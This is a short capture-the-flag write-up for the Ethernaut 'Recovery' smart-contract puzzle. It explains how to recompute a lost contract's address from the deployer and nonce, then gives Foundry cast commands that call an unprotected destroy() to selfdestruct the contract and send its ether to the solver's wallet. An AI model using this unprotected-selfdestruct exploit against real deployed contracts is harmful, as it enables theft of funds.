---
layout: writeup
title: "Recovery"
level: "Intermediate"
category: "Ethernaut"
description: "  Complete this level by recovering (or removing) the 0.001 ether from the lost contract address.
"
---

## Analysis

Contracts created with "new" have deterministic addresses.So even if the token contract address is “lost”, it can be recomputed on-chain from deployer address and Nonce.

**The Flaw:**  
Here the destroy() is public(no access control) so Anyone can call selfdestruct and ETH stored in the token contract can be sent to any address.

---

## Solution

To solve this,One can recompute the token contract address created with "new" and with the destroy() call selfdestruct and ETH stored in the token contract can be sent to any address.

---

## Foundry Scripts

<pre class="plain-code"><code>
# 1. Recompute the token contract address using following foudry script
cast compute-address $RECOVERY --nonce 1

# 2.Store the Token contract addresss
export TOKEN=0xTOKEN_ADDRESS


# 3.Destroy the token contract
cast send $TOKEN "destroy(address)" $WALLET_ADDRESS --private-key $PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL


# 4. Verify the balance
cast balance $WALLET_ADDRESS --rpc-url $SEPOLIA_RPC_URL

</code></pre>
